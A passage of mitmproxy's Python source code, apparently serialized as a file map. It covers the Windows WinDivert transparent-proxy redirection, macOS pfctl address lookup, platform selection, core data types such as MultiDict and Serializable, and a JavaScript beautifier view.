  ]\n\n\n# https://msdn.microsoft.com/en-us/library/windows/desktop/aa366905(v=vs.85).aspx\ndef MIB_TCP6TABLE_OWNER_PID(size):\n    class _MIB_TCP6TABLE_OWNER_PID(ctypes.Structure):\n        _fields_ = [\n            (\"dwNumEntries\", ctypes.wintypes.DWORD),\n            (\"table\", MIB_TCP6ROW_OWNER_PID * size),\n        ]\n\n    return _MIB_TCP6TABLE_OWNER_PID()\n\n\n#\n# IPv4\n#\n\n\n# https://msdn.microsoft.com/en-us/library/windows/desktop/aa366913(v=vs.85).aspx\nclass MIB_TCPROW_OWNER_PID(ctypes.Structure):\n    _fields_ = [\n        (\"dwState\", ctypes.wintypes.DWORD),\n        (\"ucLocalAddr\", IN4_ADDR),\n        (\"dwLocalPort\", ctypes.wintypes.DWORD),\n        (\"ucRemoteAddr\", IN4_ADDR),\n        (\"dwRemotePort\", ctypes.wintypes.DWORD),\n        (\"dwOwningPid\", ctypes.wintypes.DWORD),\n    ]\n\n\n# https://msdn.microsoft.com/en-us/library/windows/desktop/aa366921(v=vs.85).aspx\ndef MIB_TCPTABLE_OWNER_PID(size):\n    class _MIB_TCPTABLE_OWNER_PID(ctypes.Structure):\n        _fields_ = [\n            (\"dwNumEntries\", ctypes.wintypes.DWORD),\n            (\"table\", MIB_TCPROW_OWNER_PID * size),\n        ]\n\n    return _MIB_TCPTABLE_OWNER_PID()\n\n\nTCP_TABLE_OWNER_PID_CONNECTIONS = 4\n\n\nclass TcpConnectionTable(collections.abc.Mapping):\n    DEFAULT_TABLE_SIZE = 4096\n\n    def __init__(self):\n        self._tcp = MIB_TCPTABLE_OWNER_PID(self.DEFAULT_TABLE_SIZE)\n        self._tcp_size = ctypes.wintypes.DWORD(self.DEFAULT_TABLE_SIZE)\n        self._tcp6 = MIB_TCP6TABLE_OWNER_PID(self.DEFAULT_TABLE_SIZE)\n        self._tcp6_size = ctypes.wintypes.DWORD(self.DEFAULT_TABLE_SIZE)\n        self._map = {}\n\n    def __getitem__(self, item):\n        return self._map[item]\n\n    def __iter__(self):\n        return self._map.__iter__()\n\n    def __len__(self):\n        return self._map.__len__()\n\n    def refresh(self):\n        self._map = {}\n        self._refresh_ipv4()\n        self._refresh_ipv6()\n\n    def _refresh_ipv4(self):\n        ret = ctypes.windll.iphlpapi.GetExtendedTcpTable(  # type: ignore\n            ctypes.byref(self._tcp),\n            ctypes.byref(self._tcp_size),\n            False,\n            socket.AF_INET,\n            TCP_TABLE_OWNER_PID_CONNECTIONS,\n            0,\n        )\n        if ret == 0:\n            for row in self._tcp.table[: self._tcp.dwNumEntries]:\n                local_ip = socket.inet_ntop(socket.AF_INET, bytes(row.ucLocalAddr))\n                local_port = socket.htons(row.dwLocalPort)\n                self._map[(local_ip, local_port)] = row.dwOwningPid\n        elif ret == ERROR_INSUFFICIENT_BUFFER:\n            self._tcp = MIB_TCPTABLE_OWNER_PID(self._tcp_size.value)\n            # no need to update size, that's already done.\n            self._refresh_ipv4()\n        else:\n            raise RuntimeError(\n                \"[IPv4] Unknown GetExtendedTcpTable return code: %s\" % ret\n            )\n\n    def _refresh_ipv6(self):\n        ret = ctypes.windll.iphlpapi.GetExtendedTcpTable(  # type: ignore\n            ctypes.byref(self._tcp6),\n            ctypes.byref(self._tcp6_size),\n            False,\n            socket.AF_INET6,\n            TCP_TABLE_OWNER_PID_CONNECTIONS,\n            0,\n        )\n        if ret == 0:\n            for row in self._tcp6.table[: self._tcp6.dwNumEntries]:\n                local_ip = socket.inet_ntop(socket.AF_INET6, bytes(row.ucLocalAddr))\n                local_port = socket.htons(row.dwLocalPort)\n                self._map[(local_ip, local_port)] = row.dwOwningPid\n        elif ret == ERROR_INSUFFICIENT_BUFFER:\n            self._tcp6 = MIB_TCP6TABLE_OWNER_PID(self._tcp6_size.value)\n            # no need to update size, that's already done.\n            self._refresh_ipv6()\n        else:\n            raise RuntimeError(\n                \"[IPv6] Unknown GetExtendedTcpTable return code: %s\" % ret\n            )\n\n\nclass Redirect(threading.Thread):\n    daemon = True\n    windivert: pydivert.WinDivert\n\n    def __init__(\n        self,\n        handle: Callable[[pydivert.Packet], None],\n        filter: str,\n        layer: pydivert.Layer = pydivert.Layer.NETWORK,\n        flags: pydivert.Flag = 0,\n    ) -> None:\n        self.handle = handle\n        self.windivert = pydivert.WinDivert(filter, layer, flags=flags)\n        super().__init__()\n\n    def start(self):\n        self.windivert.open()\n        super().start()\n\n    def run(self):\n        while True:\n            try:\n                packet = self.windivert.recv()\n            except OSError as e:\n                if getattr(e, \"winerror\", None) == 995:\n                    return\n                else:\n                    raise\n            else:\n                self.handle(packet)\n\n    def shutdown(self):\n        self.windivert.close()\n\n    def recv(self) -> pydivert.Packet | None:\n        \"\"\"\n        Convenience function that receives a packet from the passed handler and handles error codes.\n        If the process has been shut down, None is returned.\n        \"\"\"\n        try:\n            return self.windivert.recv()\n        except OSError as e:\n            if e.winerror == 995:  # type: ignore\n                return None\n            else:\n                raise\n\n\nclass RedirectLocal(Redirect):\n    trusted_pids: set[int]\n\n    def __init__(\n        self, redirect_request: Callable[[pydivert.Packet], None], filter: str\n    ) -> None:\n        self.tcp_connections = TcpConnectionTable()\n        self.trusted_pids = set()\n        self.redirect_request = redirect_request\n        super().__init__(self.handle, filter)\n\n    def handle(self, packet):\n        client = (packet.src_addr, packet.src_port)\n\n        if client not in self.tcp_connections:\n            self.tcp_connections.refresh()\n\n        # If this fails, we most likely have a connection from an external client.\n        # In this, case we always want to proxy the request.\n        pid = self.tcp_connections.get(client, None)\n\n        if pid not in self.trusted_pids:\n            self.redirect_request(packet)\n        else:\n            # It's not really clear why we need to recalculate the checksum here,\n            # but this was identified as necessary in https://github.com/mitmproxy/mitmproxy/pull/3174.\n            self.windivert.send(packet, recalculate_checksum=True)\n\n\nTConnection = tuple[str, int]\n\n\nclass ClientServerMap:\n    \"\"\"A thread-safe LRU dict.\"\"\"\n\n    connection_cache_size: ClassVar[int] = 65536\n\n    def __init__(self):\n        self._lock = threading.Lock()\n        self._map = collections.OrderedDict()\n\n    def __getitem__(self, item: TConnection) -> TConnection:\n        with self._lock:\n            return self._map[item]\n\n    def __setitem__(self, key: TConnection, value: TConnection) -> None:\n        with self._lock:\n            self._map[key] = value\n            self._map.move_to_end(key)\n            while len(self._map) > self.connection_cache_size:\n                self._map.popitem(False)\n\n\nclass TransparentProxy:\n    \"\"\"\n    Transparent Windows Proxy for mitmproxy based on WinDivert/PyDivert. This module can be used to\n    redirect both traffic that is forwarded by the host and traffic originating from the host itself.\n\n    Requires elevated (admin) privileges. Can be started separately by manually running the file.\n\n    How it works:\n\n    (1) First, we intercept all packages that match our filter.\n    We both consider traffic that is forwarded by the OS (WinDivert's NETWORK_FORWARD layer) as well\n    as traffic sent from the local machine (WinDivert's NETWORK layer). In the case of traffic from\n    the local machine, we need to exempt packets sent from the proxy to not create a redirect loop.\n    To accomplish this, we use Windows' GetExtendedTcpTable syscall and determine the source\n    application's PID.\n\n    For each intercepted package, we\n        1. Store the source -> destination mapping (address and port)\n        2. Remove the package from the network (by not reinjecting it).\n        3. Re-inject the package into the local network stack, but with the destination address\n           changed to the proxy.\n\n    (2) Next, the proxy receives the forwarded packet, but does not know the real destination yet\n    (which we overwrote with the proxy's address). On Linux, we would now call\n    getsockopt(SO_ORIGINAL_DST). We now access the redirect module's API (see APIRequestHandler),\n    submit the source information and get the actual destination back (which we stored in 1.1).\n\n    (3) The proxy now establishes the upstream connection as usual.\n\n    (4) Finally, the proxy sends the response back to the client. To make it work, we need to change\n    the packet's source address back to the original destination (using the mapping from 1.1),\n    to which the client believes it is talking to.\n\n    Limitations:\n\n    - We assume that ephemeral TCP ports are not re-used for multiple connections at the same time.\n    The proxy will fail if an application connects to example.com and example.org from\n    192.168.0.42:4242 simultaneously. This could be mitigated by introducing unique \"meta-addresses\"\n    which mitmproxy sees, but this would remove the correct client info from mitmproxy.\n    \"\"\"\n\n    local: RedirectLocal | None = None\n    # really weird linting error here.\n    forward: Redirect | None = None\n    response: Redirect\n    icmp: Redirect\n\n    proxy_port: int\n    filter: str\n\n    client_server_map: ClientServerMap\n\n    def __init__(\n        self,\n        local: bool = True,\n        forward: bool = True,\n        proxy_port: int = 8080,\n        filter: str | None = \"tcp.DstPort == 80 or tcp.DstPort == 443\",\n    ) -> None:\n        self.proxy_port = proxy_port\n        self.filter = (\n            filter\n            or f\"tcp.DstPort != {proxy_port} and tcp.DstPort != {REDIRECT_API_PORT} and tcp.DstPort < 49152\"\n        )\n\n        self.ipv4_address = get_local_ip()\n        self.ipv6_address = get_local_ip6()\n        # print(f\"IPv4: {self.ipv4_address}, IPv6: {self.ipv6_address}\")\n        self.client_server_map = ClientServerMap()\n\n        self.api = APIServer(\n            self, (REDIRECT_API_HOST, REDIRECT_API_PORT), APIRequestHandler\n        )\n        self.api_thread = threading.Thread(target=self.api.serve_forever)\n        self.api_thread.daemon = True\n\n        if forward:\n            self.forward = Redirect(\n                self.redirect_request, self.filter, pydivert.Layer.NETWORK_FORWARD\n            )\n        if local:\n            self.local = RedirectLocal(self.redirect_request, self.filter)\n\n        # The proxy server responds to the client. To the client,\n        # this response should look like it has been sent by the real target\n        self.response = Redirect(\n            self.redirect_response,\n            f\"outbound and tcp.SrcPort == {proxy_port}\",\n        )\n\n        # Block all ICMP requests (which are sent on Windows by default).\n        # If we don't do this, our proxy machine may send an ICMP redirect to the client,\n        # which instructs the client to directly connect to the real gateway\n        # if they are on the same network.\n        self.icmp = Redirect(lambda _: None, \"icmp\", flags=pydivert.Flag.DROP)\n\n    @classmethod\n    def setup(cls):\n        # TODO: Make sure that server can be killed cleanly. That's a bit difficult as we don't have access to\n        # controller.should_exit when this is called.\n        logger.warning(\n            \"Transparent mode on Windows is unsupported and flaky. Consider using local redirect mode or WireGuard mode instead.\"\n        )\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_unavailable = s.connect_ex((REDIRECT_API_HOST, REDIRECT_API_PORT))\n        if server_unavailable:\n            proxifier = TransparentProxy()\n            proxifier.start()\n\n    def start(self):\n        self.api_thread.start()\n        self.icmp.start()\n        self.response.start()\n        if self.forward:\n            self.forward.start()\n        if self.local:\n            self.local.start()\n\n    def shutdown(self):\n        if self.local:\n            self.local.shutdown()\n        if self.forward:\n            self.forward.shutdown()\n        self.response.shutdown()\n        self.icmp.shutdown()\n        self.api.shutdown()\n\n    def redirect_request(self, packet: pydivert.Packet):\n        # print(\" * Redirect client -> server to proxy\")\n        # print(f\"{packet.src_addr}:{packet.src_port} -> {packet.dst_addr}:{packet.dst_port}\")\n        client = (packet.src_addr, packet.src_port)\n\n        self.client_server_map[client] = (packet.dst_addr, packet.dst_port)\n\n        # We do need to inject to an external IP here, 127.0.0.1 does not work.\n        if packet.address_family == socket.AF_INET:\n            assert self.ipv4_address\n            packet.dst_addr = self.ipv4_address\n        elif packet.address_family == socket.AF_INET6:\n            if not self.ipv6_address:\n                self.ipv6_address = get_local_ip6(packet.src_addr)\n            assert self.ipv6_address\n            packet.dst_addr = self.ipv6_address\n        else:\n            raise RuntimeError(\"Unknown address family\")\n        packet.dst_port = self.proxy_port\n        packet.direction = pydivert.consts.Direction.INBOUND\n\n        # We need a handle on the NETWORK layer. the local handle is not guaranteed to exist,\n        # so we use the response handle.\n        self.response.windivert.send(packet)\n\n    def redirect_response(self, packet: pydivert.Packet):\n        \"\"\"\n        If the proxy responds to the client, let the client believe the target server sent the\n        packets.\n        \"\"\"\n        # print(\" * Adjust proxy -> client\")\n        client = (packet.dst_addr, packet.dst_port)\n        try:\n            packet.src_addr, packet.src_port = self.client_server_map[client]\n        except KeyError:\n            print(f\"Warning: Previously unseen connection from proxy to {client}\")\n        else:\n            packet.recalculate_checksums()\n\n        self.response.windivert.send(packet, recalculate_checksum=False)\n\n    @contextlib.contextmanager\n    def exempt(self, pid: int):\n        if self.local:\n            self.local.trusted_pids.add(pid)\n        try:\n            yield\n        finally:\n            if self.local:\n                self.local.trusted_pids.remove(pid)\n\n\nif __name__ == \"__main__\":\n    import click\n\n    @click.group()\n    def cli():\n        pass\n\n    @cli.command()\n    @click.option(\n        \"--local/--no-local\", default=True, help=\"Redirect the host's own traffic.\"\n    )\n    @click.option(\n        \"--forward/--no-forward\",\n        default=True,\n        help=\"Redirect traffic that's forwarded by the host.\",\n    )\n    @click.option(\n        \"--filter\",\n        type=str,\n        metavar=\"WINDIVERT_FILTER\",\n        help=\"Custom WinDivert interception rule.\",\n    )\n    @click.option(\n        \"-p\",\n        \"--proxy-port\",\n        type=int,\n        metavar=\"8080\",\n        default=8080,\n        help=\"The port mitmproxy is listening on.\",\n    )\n    def redirect(**options):\n        \"\"\"Redirect flows to mitmproxy.\"\"\"\n        proxy = TransparentProxy(**options)\n        proxy.start()\n        print(f\" * Redirection active.\")\n        print(f\"   Filter: {proxy.filter}\")\n        try:\n            while True:\n                time.sleep(1)\n        except KeyboardInterrupt:\n            print(\" * Shutting down...\")\n            proxy.shutdown()\n            print(\" * Shut down.\")\n\n    @cli.command()\n    def connections():\n        \"\"\"List all TCP connections and the associated PIDs.\"\"\"\n        connections = TcpConnectionTable()\n        connections.refresh()\n        for (ip, port), pid in connections.items():\n            print(f\"{ip}:{port} -> {pid}\")\n\n    cli()\n", "mitmproxy/platform/osx.py": "import subprocess\n\nfrom . import pf\n\n\"\"\"\n    Doing this the \"right\" way by using DIOCNATLOOK on the pf device turns out\n    to be a pain. Apple has made a number of modifications to the data\n    structures returned, and compiling userspace tools to test and work with\n    this turns out to be a pain in the ass. Parsing pfctl output is short,\n    simple, and works.\n\n    Note: Also Tested with FreeBSD 10 pkgng Python 2.7.x.\n    Should work almost exactly as on Mac OS X and except with some changes to\n    the output processing of pfctl (see pf.py).\n\"\"\"\n\nSTATECMD = (\"sudo\", \"-n\", \"/sbin/pfctl\", \"-s\", \"state\")\n\n\ndef original_addr(csock):\n    peer = csock.getpeername()\n    try:\n        stxt = subprocess.check_output(STATECMD, stderr=subprocess.STDOUT)\n    except subprocess.CalledProcessError as e:\n        if \"sudo: a password is required\" in e.output.decode(errors=\"replace\"):\n            insufficient_priv = True\n        else:\n            raise RuntimeError(\"Error getting pfctl state: \" + repr(e))\n    else:\n        insufficient_priv = \"sudo: a password is required\" in stxt.decode(\n            errors=\"replace\"\n        )\n\n    if insufficient_priv:\n        raise RuntimeError(\n            \"Insufficient privileges to access pfctl. \"\n            \"See https://mitmproxy.org/docs/latest/howto-transparent/#macos for details.\"\n        )\n    return pf.lookup(peer[0], peer[1], stxt)\n", "mitmproxy/platform/openbsd.py": "def original_addr(csock):\n    return csock.getsockname()\n", "mitmproxy/platform/__init__.py": "import re\nimport socket\nimport sys\nfrom collections.abc import Callable\n\n\ndef init_transparent_mode() -> None:\n    \"\"\"\n    Initialize transparent mode.\n    \"\"\"\n\n\noriginal_addr: Callable[[socket.socket], tuple[str, int]] | None\n\"\"\"\nGet the original destination for the given socket.\nThis function will be None if transparent mode is not supported.\n\"\"\"\n\nif re.match(r\"linux(?:2)?\", sys.platform):\n    from . import linux\n\n    original_addr = linux.original_addr\nelif sys.platform == \"darwin\" or sys.platform.startswith(\"freebsd\"):\n    from . import osx\n\n    original_addr = osx.original_addr\nelif sys.platform.startswith(\"openbsd\"):\n    from . import openbsd\n\n    original_addr = openbsd.original_addr\nelif sys.platform == \"win32\":\n    from . import windows\n\n    resolver = windows.Resolver()\n    init_transparent_mode = resolver.setup  # noqa\n    original_addr = resolver.original_addr\nelse:\n    original_addr = None\n\n__all__ = [\"original_addr\", \"init_transparent_mode\"]\n", "mitmproxy/coretypes/multidict.py": "from abc import ABCMeta\nfrom abc import abstractmethod\nfrom collections.abc import Iterator\nfrom collections.abc import MutableMapping\nfrom collections.abc import Sequence\nfrom typing import TypeVar\n\nfrom mitmproxy.coretypes import serializable\n\nKT = TypeVar(\"KT\")\nVT = TypeVar(\"VT\")\n\n\nclass _MultiDict(MutableMapping[KT, VT], metaclass=ABCMeta):\n    \"\"\"\n    A MultiDict is a dictionary-like data structure that supports multiple values per key.\n    \"\"\"\n\n    fields: tuple[tuple[KT, VT], ...]\n    \"\"\"The underlying raw datastructure.\"\"\"\n\n    def __repr__(self):\n        fields = (repr(field) for field in self.fields)\n        return \"{cls}[{fields}]\".format(\n            cls=type(self).__name__, fields=\", \".join(fields)\n        )\n\n    @staticmethod\n    @abstractmethod\n    def _reduce_values(values: Sequence[VT]) -> VT:\n        \"\"\"\n        If a user accesses multidict[\"foo\"], this method\n        reduces all values for \"foo\" to a single value that is returned.\n        For example, HTTP headers are folded, whereas we will just take\n        the first cookie we found with that name.\n        \"\"\"\n\n    @staticmethod\n    @abstractmethod\n    def _kconv(key: KT) -> KT:\n        \"\"\"\n        This method converts a key to its canonical representation.\n        For example, HTTP headers are case-insensitive, so this method returns key.lower().\n        \"\"\"\n\n    def __getitem__(self, key: KT) -> VT:\n        values = self.get_all(key)\n        if not values:\n            raise KeyError(key)\n        return self._reduce_values(values)\n\n    def __setitem__(self, key: KT, value: VT) -> None:\n        self.set_all(key, [value])\n\n    def __delitem__(self, key: KT) -> None:\n        if key not in self:\n            raise KeyError(key)\n        key = self._kconv(key)\n        self.fields = tuple(\n            field for field in self.fields if key != self._kconv(field[0])\n        )\n\n    def __iter__(self) -> Iterator[KT]:\n        seen = set()\n        for key, _ in self.fields:\n            key_kconv = self._kconv(key)\n            if key_kconv not in seen:\n                seen.add(key_kconv)\n                yield key\n\n    def __len__(self) -> int:\n        return len({self._kconv(key) for key, _ in self.fields})\n\n    def __eq__(self, other) -> bool:\n        if isinstance(other, MultiDict):\n            return self.fields == other.fields\n        return False\n\n    def get_all(self, key: KT) -> list[VT]:\n        \"\"\"\n        Return the list of all values for a given key.\n        If that key is not in the MultiDict, the return value will be an empty list.\n        \"\"\"\n        key = self._kconv(key)\n        return [value for k, value in self.fields if self._kconv(k) == key]\n\n    def set_all(self, key: KT, values: list[VT]) -> None:\n        \"\"\"\n        Remove the old values for a key and add new ones.\n        \"\"\"\n        key_kconv = self._kconv(key)\n\n        new_fields: list[tuple[KT, VT]] = []\n        for field in self.fields:\n            if self._kconv(field[0]) == key_kconv:\n                if values:\n                    new_fields.append((field[0], values.pop(0)))\n            else:\n                new_fields.append(field)\n        while values:\n            new_fields.append((key, values.pop(0)))\n        self.fields = tuple(new_fields)\n\n    def add(self, key: KT, value: VT) -> None:\n        \"\"\"\n        Add an additional value for the given key at the bottom.\n        \"\"\"\n        self.insert(len(self.fields), key, value)\n\n    def insert(self, index: int, key: KT, value: VT) -> None:\n        \"\"\"\n        Insert an additional value for the given key at the specified position.\n        \"\"\"\n        item = (key, value)\n        self.fields = self.fields[:index] + (item,) + self.fields[index:]\n\n    def keys(self, multi: bool = False):\n        \"\"\"\n        Get all keys.\n\n        If `multi` is True, one key per value will be returned.\n        If `multi` is False, duplicate keys will only be returned once.\n        \"\"\"\n        return (k for k, _ in self.items(multi))\n\n    def values(self, multi: bool = False):\n        \"\"\"\n        Get all values.\n\n        If `multi` is True, all values will be returned.\n        If `multi` is False, only the first value per key will be returned.\n        \"\"\"\n        return (v for _, v in self.items(multi))\n\n    def items(self, multi: bool = False):\n        \"\"\"\n        Get all (key, value) tuples.\n\n        If `multi` is True, all `(key, value)` pairs will be returned.\n        If False, only one tuple per key is returned.\n        \"\"\"\n        if multi:\n            return self.fields\n        else:\n            return super().items()\n\n\nclass MultiDict(_MultiDict[KT, VT], serializable.Serializable):\n    \"\"\"A concrete MultiDict, storing its own data.\"\"\"\n\n    def __init__(self, fields=()):\n        super().__init__()\n        self.fields = tuple(tuple(i) for i in fields)  # type: ignore\n\n    @staticmethod\n    def _reduce_values(values):\n        return values[0]\n\n    @staticmethod\n    def _kconv(key):\n        return key\n\n    def get_state(self):\n        return self.fields\n\n    def set_state(self, state):\n        self.fields = tuple(tuple(x) for x in state)  # type: ignore\n\n    @classmethod\n    def from_state(cls, state):\n        return cls(state)\n\n\nclass MultiDictView(_MultiDict[KT, VT]):\n    \"\"\"\n    The MultiDictView provides the MultiDict interface over calculated data.\n    The view itself contains no state - data is retrieved from the parent on\n    request, and stored back to the parent on change.\n    \"\"\"\n\n    def __init__(self, getter, setter):\n        self._getter = getter\n        self._setter = setter\n        super().__init__()\n\n    @staticmethod\n    def _kconv(key):\n        # All request-attributes are case-sensitive.\n        return key\n\n    @staticmethod\n    def _reduce_values(values):\n        # We just return the first element if\n        # multiple elements exist with the same key.\n        return values[0]\n\n    @property  # type: ignore\n    def fields(self):\n        return self._getter()\n\n    @fields.setter\n    def fields(self, value):\n        self._setter(value)\n\n    def copy(self) -> \"MultiDict[KT,VT]\":\n        return MultiDict(self.fields)\n", "mitmproxy/coretypes/bidi.py": "class BiDi:\n    \"\"\"\n    A wee utility class for keeping bi-directional mappings, like field\n    constants in protocols. Names are attributes on the object, dict-like\n    access maps values to names:\n\n    CONST = BiDi(a=1, b=2)\n    assert CONST.a == 1\n    assert CONST.get_name(1) == \"a\"\n    \"\"\"\n\n    def __init__(self, **kwargs):\n        self.names = kwargs\n        self.values = {}\n        for k, v in kwargs.items():\n            self.values[v] = k\n        if len(self.names) != len(self.values):\n            raise ValueError(\"Duplicate values not allowed.\")\n\n    def __getattr__(self, k):\n        if k in self.names:\n            return self.names[k]\n        raise AttributeError(\"No such attribute: %s\", k)\n\n    def get_name(self, n, default=None):\n        return self.values.get(n, default)\n", "mitmproxy/coretypes/__init__.py": "", "mitmproxy/coretypes/serializable.py": "import abc\nimport collections.abc\nimport dataclasses\nimport enum\nimport typing\nimport uuid\nfrom functools import cache\nfrom typing import TypeVar\n\ntry:\n    from types import NoneType\n    from types import UnionType\nexcept ImportError:  # pragma: no cover\n\n    class UnionType:  # type: ignore\n        pass\n\n    NoneType = type(None)  # type: ignore\n\nT = TypeVar(\"T\", bound=\"Serializable\")\n\nState = typing.Any\n\n\nclass Serializable(metaclass=abc.ABCMeta):\n    \"\"\"\n    Abstract Base Class that defines an API to save an object's state and restore it later on.\n    \"\"\"\n\n    @classmethod\n    @abc.abstractmethod\n    def from_state(cls: type[T], state) -> T:\n        \"\"\"\n        Create a new object from the given state.\n        Consumes the passed state.\n        \"\"\"\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def get_state(self) -> State:\n        \"\"\"\n        Retrieve object state.\n        \"\"\"\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def set_state(self, state):\n        \"\"\"\n        Set object state to the given state. Consumes the passed state.\n        May return a `dataclasses.FrozenInstanceError` if the object is immutable.\n        \"\"\"\n        raise NotImplementedError()\n\n    def copy(self: T) -> T:\n        state = self.get_state()\n        if isinstance(state, dict) and \"id\" in state:\n            state[\"id\"] = str(uuid.uuid4())\n        return self.from_state(state)\n\n\nU = TypeVar(\"U\", bound=\"SerializableDataclass\")\n\n\nclass SerializableDataclass(Serializable):\n    @classmethod\n    @cache\n    def __fields(cls) -> tuple[dataclasses.Field, ...]:\n        # with from __future__ import annotations, `field.type` is a string,\n        # see https://github.com/python/cpython/issues/83623.\n        hints = typing.get_type_hints(cls)\n        fields = []\n        # noinspection PyDataclass\n        for field in dataclasses.fields(cls):  # type: ignore[arg-type]\n            if field.metadata.get(\"serialize\", True) is False:\n                continue\n            if isinstance(field.type, str):\n                field.type = hints[field.name]\n            fields.append(field)\n        return tuple(fields)\n\n    def get_state(self) -> State:\n        state = {}\n        for field in self.__fields():\n            val = getattr(self, field.name)\n            state[field.name] = _to_state(val, field.type, field.name)\n        return state\n\n    @classmethod\n    def from_state(cls: type[U], state) -> U:\n        # state = state.copy()\n        for field in cls.__fields():\n            state[field.name] = _to_val(state[field.name], field.type, field.name)\n        try:\n            return cls(**state)  # type: ignore\n        except TypeError as e:\n            raise ValueError(f\"Invalid state for {cls}: {e} ({state=})\") from e\n\n    def set_state(self, state: State) -> None:\n        for field in self.__fields():\n            current = getattr(self, field.name)\n            f_state = state.pop(field.name)\n            if isinstance(current, Serializable) and f_state is not None:\n                try:\n                    current.set_state(f_state)\n                    continue\n                except dataclasses.FrozenInstanceError:\n                    pass\n            val = _to_val(f_state, field.type, field.name)\n            try:\n                setattr(self, field.name, val)\n            except dataclasses.FrozenInstanceError:\n                state[field.name] = f_state  # restore state dict.\n                raise\n\n        if state:\n            raise ValueError(\n                f\"Unexpected fields in {type(self).__name__}.set_state: {state}\"\n            )\n\n\nV = TypeVar(\"V\")\n\n\ndef _process(attr_val: typing.Any, attr_type: type[V], attr_name: str, make: bool) -> V:\n    origin = typing.get_origin(attr_type)\n    if origin is typing.Literal:\n        if attr_val not in typing.get_args(attr_type):\n            raise ValueError(\n                f\"Invalid value for {attr_name}: {attr_val!r} does not match any literal value.\"\n            )\n        return attr_val\n    if origin in (UnionType, typing.Union):\n        attr_type, nt = typing.get_args(attr_type)\n        assert (\n            nt is NoneType\n        ), f\"{attr_name}: only `x | None` union types are supported`\"\n        if attr_val is None:\n            return None  # type: ignore\n        else:\n            return _process(attr_val, attr_type, attr_name, make)\n    else:\n        if attr_val is None:\n            raise ValueError(f\"Attribute {attr_name} must not be None.\")\n\n    if make and hasattr(attr_type, \"from_state\"):\n        return attr_type.from_state(attr_val)  # type: ignore\n    elif not make and hasattr(attr_type, \"get_state\"):\n        return attr_val.get_state()\n\n    if origin in (list, collections.abc.Sequence):\n        (T,) = typing.get_args(attr_type)\n        return [_process(x, T, attr_name, make) for x in attr_val]  # type: ignore\n    elif origin is tuple:\n        # We don't have a good way to represent tuple[str,int] | tuple[str,int,int,int], so we do a dirty hack here.\n        if attr_name in (\"peername\", \"sockname\"):\n            return tuple(\n                _process(x, T, attr_name, make)\n                for x, T in zip(attr_val, [str, int, int, int])\n            )  # type: ignore\n        Ts = typing.get_args(attr_type)\n        if len(Ts) != len(attr_val):\n            raise ValueError(\n                f\"Invalid data for {attr_name}. Expected {Ts}, got {attr_val}.\"\n            )\n        return tuple(_process(x, T, attr_name, make) for T, x in zip(Ts, attr_val))  # type: ignore\n    elif origin is dict:\n        k_cls, v_cls = typing.get_args(attr_type)\n        return {\n            _process(k, k_cls, attr_name, make): _process(v, v_cls, attr_name, make)\n            for k, v in attr_val.items()\n        }  # type: ignore\n    elif attr_type in (int, float):\n        if not isinstance(attr_val, (int, float)):\n            raise ValueError(\n                f\"Invalid value for {attr_name}. Expected {attr_type}, got {attr_val} ({type(attr_val)}).\"\n            )\n        return attr_type(attr_val)  # type: ignore\n    elif attr_type in (str, bytes, bool):\n        if not isinstance(attr_val, attr_type):\n            raise ValueError(\n                f\"Invalid value for {attr_name}. Expected {attr_type}, got {attr_val} ({type(attr_val)}).\"\n            )\n        return attr_type(attr_val)  # type: ignore\n    elif isinstance(attr_type, type) and issubclass(attr_type, enum.Enum):\n        if make:\n            return attr_type(attr_val)  # type: ignore\n        else:\n            return attr_val.value\n    else:\n        raise TypeError(f\"Unexpected type for {attr_name}: {attr_type!r}\")\n\n\ndef _to_val(state: typing.Any, attr_type: type[U], attr_name: str) -> U:\n    \"\"\"Create an object based on the state given in val.\"\"\"\n    return _process(state, attr_type, attr_name, True)\n\n\ndef _to_state(value: typing.Any, attr_type: type[U], attr_name: str) -> U:\n    \"\"\"Get the state of the object given as val.\"\"\"\n    return _process(value, attr_type, attr_name, False)\n", "mitmproxy/contentviews/javascript.py": "import io\nimport re\n\nfrom mitmproxy.contentviews import base\nfrom mitmproxy.utils import strutils\n\nDELIMITERS = \"{};\\n\"\nSPECIAL_AREAS = (\n    r\"(?<=[^\\w\\s)])\\s*/(?:[^\\n/]|(?<!\\\\)(?:\\\\\\\\)*\\\\/)+?/(?=[gimsuy]{0,6}\\s*(?:[;,).\\n]|$))\",\n    r\"'\" + strutils.MULTILINE_CONTENT_LINE_CONTINUATION + strutils.NO_ESCAPE + \"'\",\n    r'\"' + strutils.MULTILINE_CONTENT_LINE_CONTINUATION + strutils.NO_ESCAPE + '\"',\n    r\"`\" + strutils.MULTILINE_CONTENT + strutils.NO_ESCAPE + \"`\",\n    r\"/\\*\" + strutils.MULTILINE_CONTENT + r\"\\*/\",\n    r\"//\" + strutils.SINGLELINE_CONTENT + \"$\",\n    r\"for\\(\" + strutils.SINGLELINE_CONTENT + r\"\\)\",\n)\n\n\ndef beautify(data):\n    data = strutils.escape_special_areas(data, SPECIAL_AREAS, DELIMITERS)\n\n    data = re.sub(r\"\\s*{\\s*(?!};)\", \" {\\n\", data)\n    data = re.sub(r\"\\s*;\\s*\", \";\\n\", data)\n    data = re.sub(r\"(?<!{)\\s*}(;)?\\s*\", r\"\\n}\\1\\n\", data)\n\n    beautified = io.StringIO()\n    indent_level = 0\n\n    for line in data.splitlines(True):\n        if line.endswith(\"{\\n\"):\n            beautified.write(\" \" * 2 * indent_level + line)\n            indent_level += 1\n        elif line.startswith(\"}\"):\n            indent_level -= 1\n            beautified.write(\" \" * 2 * indent_level + line)\n        else:\n            beautified.write(\" \" * 2 * indent_level + line)\n\n    data = strutils.unescape_special_areas(beautified.getvalue())\n    return data\n\n\nclass ViewJavaScript(base.View):\n    name = \"JavaScript\"\n    __content_types = (\n        \"application/x-javascript\",\n        \"application/javascript\",\n        \"text/javascript\",\n    )\n\n    def __call__(self, data, **metadata):\n        data = data.decode(\"utf-8\", \"replace\")\n        res = beautify(data)\n        return \"JavaScript\", base.format_text(res)\n\n    def render_priority(\n        self, data: bytes, *, content_type: str | None = None, **metadata\n    ) -> float:\n        return float(bool(data) and content_type in self.__content_types)\n", "mitmproxy/contentviews/wbxml.py": "from . import base\nfrom mitmproxy.contrib.wbxml import ASCommandResponse\n\n\nclass ViewWBXML(base.View):\n    name = \"WBXML\"\n    __content_types = (\"application/vnd.wap.wbxml\", \"application/vnd.ms-sync.wbxml\")\n\n    def __call__(self, data, **metadata):\n        try:\n            